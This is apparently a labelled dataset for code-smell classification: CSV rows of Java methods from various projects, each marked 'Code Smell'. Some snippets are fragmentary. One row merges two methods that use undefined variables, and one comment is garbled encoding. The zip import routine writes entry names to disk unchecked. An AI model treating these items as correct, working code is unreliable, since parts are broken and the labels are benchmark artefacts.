text,label,text_label
"public boolean hasPermission(Authentication authentication,String requestMethod,String requestURI){
  if (HttpMethod.OPTIONS.name().equalsIgnoreCase(requestMethod)) {
    return true;
  }
  if (!(authentication instanceof AnonymousAuthenticationToken)) {
    if (!securityProperties.getAuth().getUrlPermission().getEnable()) {
      return true;
    }
    OAuth2IntrospectionAuthenticatedPrincipal authenticatedPrincipal=(OAuth2IntrospectionAuthenticatedPrincipal)authentication.getPrincipal();
    String username=authenticatedPrincipal.getName();
    if (CommonConstant.ADMIN_USER_NAME.equals(username)) {
      return true;
    }
    Map<String,Object> claims=authenticatedPrincipal.getAttributes();
    String clientId=(String)claims.get(SecurityConstants.CLIENT_ID);
    if (!isNeedAuth(clientId)) {
      return true;
    }
    for (    String path : securityProperties.getAuth().getUrlPermission().getIgnoreUrls()) {
      if (antPathMatcher.match(path,requestURI)) {
        return true;
      }
    }
    Collection<SimpleGrantedAuthority> grantedAuthorityList=(Collection<SimpleGrantedAuthority>)authentication.getAuthorities();
    if (CollectionUtil.isEmpty(grantedAuthorityList)) {
      log.warn(""角色列表为空：{}"",authentication.getPrincipal());
      return false;
    }
    TenantContextHolder.setTenant(clientId);
    String roleCodes=grantedAuthorityList.stream().map(SimpleGrantedAuthority::getAuthority).collect(Collectors.joining("", ""));
    List<SysMenu> menuList=findMenuByRoleCodes(roleCodes);
    for (    SysMenu menu : menuList) {
      if (StringUtils.isNotEmpty(menu.getUrl()) && antPathMatcher.match(menu.getUrl(),requestURI)) {
        if (StrUtil.isNotEmpty(menu.getPathMethod())) {
          return requestMethod.equalsIgnoreCase(menu.getPathMethod());
        }
 else {
          return true;
        }
      }
    }
  }
  return false;
}",1,Code Smell
"public static Exprent propagateBoolNot(Exprent exprent){
  if (exprent.type == Exprent.EXPRENT_FUNCTION) {
    FunctionExprent fexpr=(FunctionExprent)exprent;
    if (fexpr.getFuncType() == FunctionExprent.FUNCTION_BOOL_NOT) {
      Exprent param=fexpr.getLstOperands().get(0);
      if (param.type == Exprent.EXPRENT_FUNCTION) {
        FunctionExprent fparam=(FunctionExprent)param;
        int ftype=fparam.getFuncType();
switch (ftype) {
case FunctionExprent.FUNCTION_BOOL_NOT:
          Exprent newexpr=fparam.getLstOperands().get(0);
        Exprent retexpr=propagateBoolNot(newexpr);
      return retexpr == null ? newexpr : retexpr;
case FunctionExprent.FUNCTION_CADD:
case FunctionExprent.FUNCTION_COR:
    List<Exprent> operands=fparam.getLstOperands();
  for (int i=0; i < operands.size(); i++) {
    Exprent newparam=new FunctionExprent(FunctionExprent.FUNCTION_BOOL_NOT,operands.get(i),operands.get(i).bytecode);
    Exprent retparam=propagateBoolNot(newparam);
    operands.set(i,retparam == null ? newparam : retparam);
  }
case FunctionExprent.FUNCTION_EQ:
case FunctionExprent.FUNCTION_NE:
case FunctionExprent.FUNCTION_LT:
case FunctionExprent.FUNCTION_GE:
case FunctionExprent.FUNCTION_GT:
case FunctionExprent.FUNCTION_LE:
fparam.setFuncType(funcsnot[ftype - FunctionExprent.FUNCTION_EQ]);
return fparam;
}
}
}
}
return null;
}",1,Code Smell
"/** 
 * Paint a 2-bit/pixel code string, as defined by ETSI EN 300 743 7.2.5.2, to a canvas.
 */
private static int paint2BitPixelCodeString(ParsableBitArray data,int[] clutEntries,byte[] clutMapTable,int column,int line,Paint paint,Canvas canvas){
  boolean endOfPixelCodeString=false;
  do {
    int runLength=0;
    int clutIndex=0;
    int peek=data.readBits(2);
    if (peek != 0x00) {
      runLength=1;
      clutIndex=peek;
    }
 else     if (data.readBit()) {
      runLength=3 + data.readBits(3);
      clutIndex=data.readBits(2);
    }
 else     if (data.readBit()) {
      runLength=1;
    }
 else {
switch (data.readBits(2)) {
case 0x00:
        endOfPixelCodeString=true;
      break;
case 0x01:
    runLength=2;
  break;
case 0x02:
runLength=12 + data.readBits(4);
clutIndex=data.readBits(2);
break;
case 0x03:
runLength=29 + data.readBits(8);
clutIndex=data.readBits(2);
break;
}
}
if (runLength != 0 && paint != null) {
paint.setColor(clutEntries[clutMapTable != null ? clutMapTable[clutIndex] : clutIndex]);
canvas.drawRect(column,line,column + runLength,line + 1,paint);
}
column+=runLength;
}
 while (!endOfPixelCodeString);
return column;
}",1,Code Smell
"public void updateVisibleSkulls(){
  if (cullingEnabled) {
    if (lastPlayerPosition != null && session.getPlayerEntity().getPosition().distanceSquared(lastPlayerPosition) < 4) {
      return;
    }
    lastPlayerPosition=session.getPlayerEntity().getPosition();
    inRangeSkulls.clear();
    for (    Skull skull : skulls.values()) {
      if (skull.blockDefinition != null) {
        continue;
      }
      skull.distanceSquared=skull.position.distanceSquared(lastPlayerPosition.getX(),lastPlayerPosition.getY(),lastPlayerPosition.getZ());
      if (skull.distanceSquared > skullRenderDistanceSquared) {
        freeSkullEntity(skull);
      }
 else {
        inRangeSkulls.add(skull);
      }
    }
    inRangeSkulls.sort(Comparator.comparingInt(Skull::getDistanceSquared));
    for (int i=inRangeSkulls.size() - 1; i >= 0; i--) {
      if (i < maxVisibleSkulls) {
        assignSkullEntity(inRangeSkulls.get(i));
      }
 else {
        freeSkullEntity(inRangeSkulls.get(i));
      }
    }
  }
}",1,Code Smell
"@java.lang.Override public boolean equals(final java.lang.Object obj){
  if (obj == this) {
    return true;
  }
  if (!(obj instanceof org.tribuo.common.tree.protos.SplitNodeProto)) {
    return super.equals(obj);
  }
  org.tribuo.common.tree.protos.SplitNodeProto other=(org.tribuo.common.tree.protos.SplitNodeProto)obj;
  if (getParentIdx() != other.getParentIdx())   return false;
  if (getCurIdx() != other.getCurIdx())   return false;
  if (getGreaterThanIdx() != other.getGreaterThanIdx())   return false;
  if (getLessThanOrEqualIdx() != other.getLessThanOrEqualIdx())   return false;
  if (getSplitFeatureIdx() != other.getSplitFeatureIdx())   return false;
  if (java.lang.Double.doubleToLongBits(getSplitValue()) != java.lang.Double.doubleToLongBits(other.getSplitValue()))   return false;
  if (java.lang.Double.doubleToLongBits(getImpurity()) != java.lang.Double.doubleToLongBits(other.getImpurity()))   return false;
  if (!unknownFields.equals(other.unknownFields))   return false;
  return true;
}
",1,Code Smell
"@Override public void visitAnyInstruction(Clazz clazz,Method method,CodeAttribute codeAttribute,int offset,Instruction instruction){
  FromJsonInvocationMatcher matchingMatcher=null;
  for (  FromJsonInvocationMatcher matcher : fromJsonInvocationMatchers) {
    instruction.accept(clazz,method,codeAttribute,offset,matcher);
    if (matcher.isMatching()) {
      matchingMatcher=matcher;
      break;
    }
  }
  if (matchingMatcher != null) {
    logger.debug(""GsonDeserializationInvocationFinder: Gson#fromJson: {}.{}{} {}"",clazz.getName(),method.getName(clazz),method.getDescriptor(clazz),instruction.toString(offset));
    lazyPartialEvaluator.visitCodeAttribute(clazz,method,codeAttribute);
    int stackElementIndex=matchingMatcher.typeStackElementIndex == -1 ? matchingMatcher.classStackElementIndex : matchingMatcher.typeStackElementIndex;
    InstructionOffsetValue producer=partialEvaluator.getStackBefore(offset).getTopActualProducerValue(stackElementIndex).instructionOffsetValue();
    TypeArgumentFinder typeArgumentFinder=new TypeArgumentFinder(programClassPool,libraryClassPool,partialEvaluator);
    for (int i=0; i < producer.instructionOffsetCount(); i++) {
      codeAttribute.instructionAccept(clazz,method,producer.instructionOffset(i),typeArgumentFinder);
    }
    String[] targetTypes=typeArgumentFinder.typeArgumentClasses;
    if (targetTypes != null) {
      for (      String targetType : targetTypes) {
        logger.debug(""GsonDeserializationInvocationFinder: deserialized type: {}"",targetType);
        programClassPool.classAccept(targetType,domainClassVisitor);
      }
    }
 else     if (warningPrinter != null) {
      warningPrinter.print(clazz.getName(),""Warning: can't derive deserialized type from fromJson() invocation in "" + clazz.getName() + "".""+ method.getName(clazz)+ method.getDescriptor(clazz));
    }
  }
}",1,Code Smell
"@Override public J visitMethodInvocation(J.MethodInvocation method,ExecutionContext ctx){
  J.MethodInvocation m=(J.MethodInvocation)super.visitMethodInvocation(method,ctx);
  if (!dependencyDsl.matches(m)) {
    return m;
  }
  if (m.getArguments().isEmpty()) {
    return m;
  }
  Map<String,Expression> mapNotation=new HashMap<>();
  if (m.getArguments().get(0) instanceof G.MapLiteral) {
    G.MapLiteral arg=(G.MapLiteral)m.getArguments().get(0);
    for (    G.MapEntry entry : arg.getElements()) {
      if (entry.getKey() instanceof J.Literal) {
        J.Literal key=(J.Literal)entry.getKey();
        if (key.getType() == JavaType.Primitive.String) {
          mapNotation.put((String)key.getValue(),entry.getValue());
        }
      }
    }
    J.Literal stringNotation=toLiteral(arg.getPrefix(),arg.getMarkers(),mapNotation);
    if (stringNotation == null) {
      return m;
    }
    Expression lastArg=m.getArguments().get(m.getArguments().size() - 1);
    if (lastArg instanceof J.Lambda) {
      m=m.withArguments(Arrays.asList(stringNotation,lastArg));
    }
 else {
      m=m.withArguments(Collections.singletonList(stringNotation));
    }
  }
 else   if (m.getArguments().get(0) instanceof G.MapEntry) {
    G.MapEntry firstEntry=(G.MapEntry)m.getArguments().get(0);
    Space prefix=firstEntry.getPrefix();
    Markers markers=firstEntry.getMarkers();
    for (    Expression e : m.getArguments()) {
      if (e instanceof G.MapEntry) {
        G.MapEntry entry=(G.MapEntry)e;
        if (entry.getKey() instanceof J.Literal) {
          J.Literal key=(J.Literal)entry.getKey();
          if (key.getType() == JavaType.Primitive.String) {
            mapNotation.put((String)key.getValue(),entry.getValue());
          }
        }
      }
    }
    J.Literal stringNotation=toLiteral(prefix,markers,mapNotation);
    if (stringNotation == null) {
      return m;
    }
    Expression lastArg=m.getArguments().get(m.getArguments().size() - 1);
    if (lastArg instanceof J.Lambda) {
      m=m.withArguments(Arrays.asList(stringNotation,lastArg));
    }
 else {
      m=m.withArguments(Collections.singletonList(stringNotation));
    }
  }
  return m;
}",1,Code Smell
"/** 
 * Compress all files under the specific folder to a single zip file. <p> Should be call in background thread.
 * @param folderPath  the specific folder path
 * @param zipFilePath the zip file path
 * @throws IOException if any error occurs
 * @since 2.14.0
 */
public static void compress(String folderPath,String zipFilePath) throws IOException {
  File folder=new File(folderPath);
  if (!folder.exists() || !folder.isDirectory()) {
    throw new IOException(""Folder "" + folderPath + "" does't exist or isn't a directory"");
  }
  File zipFile=new File(zipFilePath);
  if (!zipFile.exists()) {
    File zipFolder=zipFile.getParentFile();
    if (!zipFolder.exists()) {
      if (!zipFolder.mkdirs()) {
        throw new IOException(""Zip folder "" + zipFolder.getAbsolutePath() + "" not created"");
      }
    }
    if (!zipFile.createNewFile()) {
      throw new IOException(""Zip file "" + zipFilePath + "" not created"");
    }
  }
  BufferedInputStream bis;
  ZipOutputStream zos=new ZipOutputStream(new BufferedOutputStream(new FileOutputStream(zipFile)));
  try {
    final int BUFFER_SIZE=8 * 1024;
    byte buffer[]=new byte[BUFFER_SIZE];
    for (    String fileName : folder.list()) {
      if (fileName.equals(""."") || fileName.equals("".."")) {
        continue;
      }
      File file=new File(folder,fileName);
      if (!file.isFile()) {
        continue;
      }
      FileInputStream fis=new FileInputStream(file);
      bis=new BufferedInputStream(fis,BUFFER_SIZE);
      try {
        ZipEntry entry=new ZipEntry(fileName);
        zos.putNextEntry(entry);
        int count;
        while ((count=bis.read(buffer,0,BUFFER_SIZE)) != -1) {
          zos.write(buffer,0,count);
        }
      }
  finally {
        try {
          bis.close();
        }
 catch (        IOException e) {
        }
      }
    }
  }
  finally {
    try {
      zos.close();
    }
 catch (    IOException e) {
    }
  }
}",1,Code Smell
"protected void inflateCagetory(HtmlChartPlugin plugin){
  if (plugin == null)   return;
  List<Category> categories=plugin.getCategories();
  if (categories == null)   return;
  for (int i=0; i < categories.size(); i++) {
    Category category=categories.get(i);
    String categoryName=category.getName();
    Map<String,ChartPlugin> map=getChartPluginMap();
    if (category.hasNameLabel()) {
      for (      ChartPlugin chartPlugin : map.values()) {
        if (!(chartPlugin instanceof AbstractChartPlugin))         continue;
        List<Category> myCategories=chartPlugin.getCategories();
        if (myCategories == null)         continue;
        for (int j=0; j < myCategories.size(); j++) {
          Category myCategory=myCategories.get(j);
          if (myCategory != null && myCategory != category && StringUtil.isEquals(myCategory.getName(),categoryName)) {
            myCategories.set(j,category);
          }
        }
      }
    }
 else {
      for (      ChartPlugin chartPlugin : map.values()) {
        List<Category> myCategories=chartPlugin.getCategories();
        if (myCategories == null)         continue;
        Category fullCategory=null;
        for (        Category myCategory : myCategories) {
          if (myCategory != null && myCategory != category && myCategory.hasNameLabel() && StringUtil.isEquals(myCategory.getName(),categoryName)) {
            fullCategory=myCategory;
            break;
          }
        }
        if (fullCategory != null) {
          categories.set(i,fullCategory);
          break;
        }
      }
    }
  }
}",1,Code Smell
"@Override public void augment(S struc){
  var currentContextMenu=new AtomicReference<ContextMenu>();
  Supplier<Boolean> hide=() -> {
    if (currentContextMenu.get() != null && currentContextMenu.get().isShowing()) {
      currentContextMenu.get().hide();
      currentContextMenu.set(null);
      return true;
    }
    return false;
  }
;
  var r=struc.get();
  r.addEventHandler(MouseEvent.MOUSE_CLICKED,event -> {
    if (mouseEventCheck != null && mouseEventCheck.test(event)) {
      if (!hide.get()) {
        var cm=contextMenu.get();
        if (cm != null) {
          cm.show(r,event.getScreenX(),event.getScreenY());
          currentContextMenu.set(cm);
        }
      }
      event.consume();
    }
  }
);
  r.addEventHandler(MouseEvent.MOUSE_PRESSED,event -> {
    if (mouseEventCheck != null && mouseEventCheck.test(event)) {
      event.consume();
    }
  }
);
  r.addEventHandler(KeyEvent.KEY_RELEASED,event -> {
    if (keyEventCheck != null && keyEventCheck.test(event)) {
      event.consume();
    }
  }
);
  r.addEventHandler(KeyEvent.KEY_PRESSED,event -> {
    if (keyEventCheck != null && keyEventCheck.test(event)) {
      if (!hide.get()) {
        var cm=contextMenu.get();
        if (cm != null) {
          cm.show(r,Side.BOTTOM,0,0);
          currentContextMenu.set(cm);
        }
      }
      event.consume();
    }
  }
);
  if (r instanceof ButtonBase && keyEventCheck == null) {
    buttonBase.addEventHandler(ActionEvent.ACTION,event -> {
      if (buttonBase.getOnAction() != null) {
        return;
      }
      if (!hide.get()) {
        var cm=contextMenu.get();
        if (cm != null) {
          cm.show(r,Side.BOTTOM,0,0);
          currentContextMenu.set(cm);
        }
      }
      event.consume();
    }
);
  }
}",1,Code Smell
"@java.lang.Override public int getSerializedSize(){
  int size=memoizedSize;
  if (size != -1)   return size;
  size=0;
{
    int dataSize=0;
    for (int i=0; i < label_.size(); i++) {
      dataSize+=computeStringSizeNoTag(label_.getRaw(i));
    }
    size+=dataSize;
    size+=1 * getLabelList().size();
  }
{
    int dataSize=0;
    for (int i=0; i < count_.size(); i++) {
      dataSize+=com.google.protobuf.CodedOutputStream.computeInt64SizeNoTag(count_.getLong(i));
    }
    size+=dataSize;
    if (!getCountList().isEmpty()) {
      size+=1;
      size+=com.google.protobuf.CodedOutputStream.computeInt32SizeNoTag(dataSize);
    }
    countMemoizedSerializedSize=dataSize;
  }
{
    int dataSize=0;
    for (int i=0; i < id_.size(); i++) {
      dataSize+=com.google.protobuf.CodedOutputStream.computeInt32SizeNoTag(id_.getInt(i));
    }
    size+=dataSize;
    if (!getIdList().isEmpty()) {
      size+=1;
      size+=com.google.protobuf.CodedOutputStream.computeInt32SizeNoTag(dataSize);
    }
    idMemoizedSerializedSize=dataSize;
  }
{
    int dataSize=0;
    dataSize=8 * getMaxList().size();
    size+=dataSize;
    if (!getMaxList().isEmpty()) {
      size+=1;
      size+=com.google.protobuf.CodedOutputStream.computeInt32SizeNoTag(dataSize);
    }
    maxMemoizedSerializedSize=dataSize;
  }
{
    int dataSize=0;
    dataSize=8 * getMinList().size();
    size+=dataSize;
    if (!getMinList().isEmpty()) {
      size+=1;
      size+=com.google.protobuf.CodedOutputStream.computeInt32SizeNoTag(dataSize);
    }
    minMemoizedSerializedSize=dataSize;
  }
{
    int dataSize=0;
    dataSize=8 * getMeanList().size();
    size+=dataSize;
    if (!getMeanList().isEmpty()) {
      size+=1;
      size+=com.google.protobuf.CodedOutputStream.computeInt32SizeNoTag(dataSize);
    }
    meanMemoizedSerializedSize=dataSize;
  }
{
    int dataSize=0;
    dataSize=8 * getSumSquaresList().size();
    size+=dataSize;
    if (!getSumSquaresList().isEmpty()) {
      size+=1;
      size+=com.google.protobuf.CodedOutputStream.computeInt32SizeNoTag(dataSize);
    }
    sumSquaresMemoizedSerializedSize=dataSize;
  }
  if (unknownCount_ != 0) {
    size+=com.google.protobuf.CodedOutputStream.computeInt32Size(8,unknownCount_);
  }
  if (overallCount_ != 0L) {
    size+=com.google.protobuf.CodedOutputStream.computeInt64Size(9,overallCount_);
  }
  size+=unknownFields.getSerializedSize();
  memoizedSize=size;
  return size;
}",1,Code Smell
"private void init(Context context){
  final ScaleGestureDetector scaleDetector=new ScaleGestureDetector(context,this);
  setOnTouchListener(new View.OnTouchListener(){
    @Override public boolean onTouch(    View view,    MotionEvent motionEvent){
      if (child() == null) {
        return false;
      }
      if (!enableZoom && !enableDrag) {
        return false;
      }
      int y=(int)motionEvent.getY();
      int x=(int)motionEvent.getX();
switch (motionEvent.getAction() & MotionEvent.ACTION_MASK) {
case MotionEvent.ACTION_DOWN:
        Log.i(TAG,""DOWN"");
      lastX=x;
    lastY=y;
  if (scale > MIN_ZOOM) {
    mode=Mode.DRAG_ZOOM;
    startX=motionEvent.getX() - prevDx;
    startY=motionEvent.getY() - prevDy;
  }
 else {
    mode=Mode.DRAG;
  }
break;
case MotionEvent.ACTION_MOVE:
if (enableDrag) {
if (mode == Mode.DRAG_ZOOM) {
  dx=motionEvent.getX() - startX;
  dy=motionEvent.getY() - startY;
}
 else if (mode == Mode.DRAG) {
  float tmp=y - lastY;
  setY(tmp);
  if (dragListener != null) {
    dragListener.onDragOffset(tmp,getViewHeight() / 6);
  }
}
}
break;
case MotionEvent.ACTION_POINTER_DOWN:
mode=Mode.ZOOM;
break;
case MotionEvent.ACTION_POINTER_UP:
mode=Mode.NONE;
break;
case MotionEvent.ACTION_UP:
Log.i(TAG,""UP"");
if (enableDrag && mode == Mode.DRAG) {
float tmp=y - lastY;
if (scale > 1 || Math.abs(tmp) < getViewHeight() / 6) {
new TranslateUpAnimator(ZoomableFrameLayout.this,tmp,0);
}
 else {
new TranslateUpAnimator(ZoomableFrameLayout.this,tmp,tmp > 0 ? getViewHeight() : -getViewHeight()).addListener(new AnimatorListenerAdapter(){
@Override public void onAnimationEnd(Animator animation){
if (dragListener != null) {
dragListener.onDragToFinish();
}
}
}
);
}
}
mode=Mode.NONE;
prevDx=dx;
prevDy=dy;
if (Math.abs(y - lastY) < 5 && Math.abs(x - lastX) < 5) {
if (onClickListener != null) {
onClickListener.onClick(ZoomableFrameLayout.this);
}
}
break;
}
scaleDetector.onTouchEvent(motionEvent);
if ((mode == Mode.DRAG_ZOOM && scale >= MIN_ZOOM) || mode == Mode.ZOOM) {
getParent().requestDisallowInterceptTouchEvent(true);
float maxDx=child().getWidth() * (scale - 1);
float maxDy=child().getHeight() * (scale - 1);
dx=Math.min(Math.max(dx,-maxDx),0);
dy=Math.min(Math.max(dy,-maxDy),0);
Log.i(TAG,""Width: "" + child().getWidth() + "", scale ""+ scale+ "", dx ""+ dx+ "", max ""+ maxDx);
applyScaleAndTranslation();
}
return true;
}
}
);
}",1,Code Smell
"@Override public synchronized void importFromZip(ZipInputStream in,String... ids) throws DriverEntityManagerException {
  ZipEntry zipEntry=null;
  try {
    while ((zipEntry=in.getNextEntry()) != null) {
      if (isDriverEntityInfoFileZipEntry(zipEntry)) {
        Reader reader=getDriverEntityInfoFileReader(IOUtil.getByteArrayInputStream(in));
        try {
          List<DriverEntity> driverEntities=readDriverEntities(reader);
          for (          DriverEntity driverEntity : driverEntities) {
            if (isValidDriverEntityForIdArray(driverEntity,ids)) {
              removeExists(this.driverEntities,driverEntity.getId());
              this.driverEntities.add(driverEntity);
            }
          }
        }
  finally {
          IOUtil.close(reader);
        }
      }
 else       if (isValidZipEntryForIdArray(zipEntry,ids)) {
        File file=getFileInRootDirectory(zipEntry.getName());
        if (zipEntry.isDirectory()) {
          if (file.exists())           FileUtil.clearDirectory(file);
 else           file.mkdirs();
        }
 else {
          OutputStream out=null;
          try {
            out=new FileOutputStream(file);
            IOUtil.write(in,out);
          }
  finally {
            IOUtil.close(out);
          }
        }
      }
      in.closeEntry();
    }
    writeDriverEntities();
  }
 catch (  IOException e) {
    throw new DriverEntityManagerException(e);
  }
}
",1,Code Smell
"@Override public void head(@NonNull Node node,int depth){
  if (node instanceof TextNode) {
    ssb.append(textNode.text());
  }
 else   if (node instanceof Element) {
switch (el.nodeName()) {
case ""a"":
{
        Object linkObject=null;
        String href=el.attr(""href"");
        LinkSpan.Type linkType;
        if (el.hasClass(""hashtag"")) {
          String text=el.text();
          if (text.startsWith(""#"")) {
            linkType=LinkSpan.Type.HASHTAG;
            href=text.substring(1);
            linkObject=tagsByTag.get(text.substring(1).toLowerCase());
          }
 else {
            linkType=LinkSpan.Type.URL;
          }
        }
 else         if (el.hasClass(""mention"")) {
          String id=idsByUrl.get(href);
          if (id != null) {
            linkType=LinkSpan.Type.MENTION;
            href=id;
            linkObject=mentionsByID.get(id);
          }
 else {
            linkType=LinkSpan.Type.URL;
          }
        }
 else {
          linkType=LinkSpan.Type.URL;
        }
        openSpans.add(new SpanInfo(new LinkSpan(href,null,linkType,accountID,linkObject,parentObject),ssb.length(),el));
      }
case ""br"":
    ;
case ""span"":
{
    if (el.hasClass(""invisible"")) {
      openSpans.add(new SpanInfo(new InvisibleSpan(),ssb.length(),el));
    }
  }
}
}
}
@Override public void head(Node node,int depth){
  if (node instanceof TextNode) {
    sb.append(tn.text());
  }
 else   if (node instanceof Element) {
    if (""br"".equals(el.tagName())) {
      sb.append('\n');
    }
  }
}",1,Code Smell
"private Text.FontWeight getFontWeightEnum(String strName){
  if (strName.equalsIgnoreCase(""Normal"")) {
    return Text.FontWeight.Regular;
  }
 else   if (strName.equalsIgnoreCase(""Bold"")) {
    return Text.FontWeight.Bold;
  }
 else   if (strName.equalsIgnoreCase(""100"")) {
    return Text.FontWeight.UltraLight;
  }
 else   if (strName.equalsIgnoreCase(""200"")) {
    return Text.FontWeight.Thin;
  }
 else   if (strName.equalsIgnoreCase(""300"")) {
    return Text.FontWeight.Light;
  }
 else   if (strName.equalsIgnoreCase(""400"")) {
    return Text.FontWeight.Regular;
  }
 else   if (strName.equalsIgnoreCase(""500"")) {
    return Text.FontWeight.Medium;
  }
 else   if (strName.equalsIgnoreCase(""600"")) {
    return Text.FontWeight.Semibold;
  }
 else   if (strName.equalsIgnoreCase(""700"")) {
    return Text.FontWeight.Bold;
  }
 else   if (strName.equalsIgnoreCase(""800"")) {
    return Text.FontWeight.Heavy;
  }
 else   if (strName.equalsIgnoreCase(""900"")) {
    return Text.FontWeight.ExtraBlack;
  }
 else {
    return Text.FontWeight.Regular;
  }
}",1,Code Smell
"protected KafkaLog4j2Appender(String name,Filter filter,Layout<? extends Serializable> layout,boolean ignoreExceptions,Property[] properties,String source,String bootstrapServers,String topic,String level){
  super(name,filter,layout,ignoreExceptions,properties);
  this.source=source;
  this.topic=topic;
  this.level=level;
  Properties envProperties=System.getProperties();
  Map<String,String> envs=System.getenv();
  String clusterId=envs.get(""CLUSTER_ID"");
  if (clusterId != null) {
    appId=clusterId;
    containerId=envs.get(""HOSTNAME"");
    if (envs.get(""HOSTNAME"").contains(""taskmanager"")) {
      containerType=""taskmanager"";
    }
 else {
      containerType=""jobmanager"";
    }
    if (envs.get(""_HOST_IP_ADDRESS"") != null) {
      nodeIp=envs.get(""_HOST_IP_ADDRESS"");
    }
  }
 else {
    String logFile=envProperties.getProperty(""log.file"");
    String[] values=logFile.split(File.separator);
    if (values.length >= 3) {
      appId=values[values.length - 3];
      containerId=values[values.length - 2];
      String log=values[values.length - 1];
      if (log.contains(""jobmanager"")) {
        containerType=""jobmanager"";
      }
 else       if (log.contains(""taskmanager"")) {
        containerType=""taskmanager"";
      }
 else {
        containerType=""others"";
      }
    }
 else {
      log.error(""log.file Property ({}) doesn't contains yarn application id or container id"",logFile);
    }
  }
  taskName=envProperties.getProperty(""taskName"",null);
  taskId=envProperties.getProperty(""taskId"",null);
  Properties props=new Properties();
  for (  Property property : properties) {
    props.put(property.getName(),property.getValue());
  }
  if (bootstrapServers != null) {
    props.setProperty(""bootstrap.servers"",bootstrapServers);
  }
 else {
    throw new ConfigException(""The bootstrap servers property must be specified"");
  }
  if (this.topic == null) {
    throw new ConfigException(""Topic must be specified by the Kafka log4j appender"");
  }
  String clientIdPrefix=taskId != null ? taskId : appId;
  if (clientIdPrefix != null) {
    props.setProperty(""client.id"",clientIdPrefix + ""_log"");
  }
  if (props.getProperty(""acks"") == null) {
    props.setProperty(""acks"",""0"");
  }
  if (props.getProperty(""retries"") == null) {
    props.setProperty(""retries"",""0"");
  }
  if (props.getProperty(""batch.size"") == null) {
    props.setProperty(""batch.size"",""16384"");
  }
  if (props.getProperty(""linger.ms"") == null) {
    props.setProperty(""linger.ms"",""5"");
  }
  if (props.getProperty(""compression.type"") == null) {
    props.setProperty(""compression.type"",""lz4"");
  }
  props.put(""key.serializer"",""org.apache.kafka.common.serialization.StringSerializer"");
  props.put(""value.serializer"",""org.apache.kafka.common.serialization.StringSerializer"");
  producer=new KafkaProducer<>(props);
}",1,Code Smell
"/** 
 * 銆愯繖涓柟娉曚笉鐢ㄧ湅銆戯紝绾补涓轰簡閫傞厤amis鍓嶇 鑾峰彇 SmsTimeLineVo
 * @return
 */
public static SmsTimeLineVo getSmsTimeLineVo(Map<String,List<SmsRecord>> maps){
  ArrayList<SmsTimeLineVo.ItemsVO> itemsVoS=new ArrayList<>();
  SmsTimeLineVo smsTimeLineVo=SmsTimeLineVo.builder().items(itemsVoS).build();
  for (  Map.Entry<String,List<SmsRecord>> entry : maps.entrySet()) {
    SmsTimeLineVo.ItemsVO itemsVO=SmsTimeLineVo.ItemsVO.builder().build();
    for (    SmsRecord smsRecord : entry.getValue()) {
      if (smsRecord.getMessageTemplateId() > 0) {
        itemsVO.setBusinessId(String.valueOf(smsRecord.getMessageTemplateId()));
        itemsVO.setContent(smsRecord.getMsgContent());
        itemsVO.setSendType(EnumUtil.getDescriptionByCode(smsRecord.getStatus(),SmsStatus.class));
        itemsVO.setSendTime(DateUtil.format(new Date(Long.valueOf(smsRecord.getCreated() * 1000L)),DatePattern.NORM_DATETIME_PATTERN));
      }
 else {
        itemsVO.setReceiveType(EnumUtil.getDescriptionByCode(smsRecord.getStatus(),SmsStatus.class));
        itemsVO.setReceiveContent(smsRecord.getReportContent());
        itemsVO.setReceiveTime(DateUtil.format(new Date(Long.valueOf(smsRecord.getUpdated() * 1000L)),DatePattern.NORM_DATETIME_PATTERN));
      }
    }
    itemsVoS.add(itemsVO);
  }
  return smsTimeLineVo;
}",1,Code Smell
